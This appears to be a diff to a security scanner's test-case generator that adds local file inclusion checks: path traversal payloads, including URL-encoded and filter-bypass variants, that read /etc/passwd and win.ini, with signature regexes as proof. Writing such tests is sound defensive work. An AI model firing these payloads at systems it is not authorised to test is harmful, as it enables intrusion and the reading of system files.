@@ -132,4 +132,24 @@ def gen_path_traversal(ctx: Ctx) -> list[TestCase]:
                               positive=pos(variant), negative=f"the {variant} traversal does not reach {target}",
                               rung="traversal_reads_app_file", description=f"path traversal to an app-owned file: {variant}"))
         n += 1
+    # LFI proof: the two canonical read-only system files. /etc/passwd and win.ini are world-readable
+    # and non-sensitive -- the PoC proof of traversal off the app root -- while /etc/shadow, boot.ini
+    # and anything under system32 stay banned by the safety screen. The positive is each file's
+    # unmistakable signature, so a mere 200 or a reflected path never counts.
+    passwd_rx = r"root:.*?:0:0:"
+    winini_rx = r"(?i)\[(?:fonts|extensions|mci extensions)\]"
+    lfi = [
+        ("lfi", "passwd_deep", "../../../../../../../../etc/passwd", passwd_rx),
+        ("lfi", "passwd_urlenc", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", passwd_rx),
+        ("lfi", "passwd_dotbypass", "....//....//....//....//etc/passwd", passwd_rx),
+        ("lfi", "winini_back", "..\\..\\..\\..\\..\\..\\windows\\win.ini", winini_rx),
+        ("lfi", "winini_fwd", "../../../../../../windows/win.ini", winini_rx),
+    ]
+    for family, variant, payload, rx in lfi:
+        cases.append(TestCase(case_no=n, technique=f"path_traversal.{family}.{variant}", payload=payload,
+                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
+                              positive={"type": "body_regex", "pattern": rx},
+                              negative=f"the {variant} traversal does not return the {('passwd' if 'passwd' in variant else 'win.ini')} file contents",
+                              rung="lfi_reads_system_file", description=f"local file inclusion proof: {variant}"))
+        n += 1
     return cases
